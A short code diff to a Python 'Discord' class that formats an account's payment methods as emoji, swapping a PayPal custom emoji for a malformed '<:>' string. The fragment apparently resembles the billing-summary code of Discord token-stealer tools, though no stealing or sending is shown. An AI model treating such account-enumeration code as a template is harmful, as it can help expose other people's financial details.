@@ -402,7 +402,7 @@ class Discord:
                     if method['type'] == 1:
                         methods += "💳"
                     elif method['type'] == 2:
-                        methods += "<:paypal:973417655627288666>"
+                        methods += "<:>"
                     else:
                         methods += "❓"
 
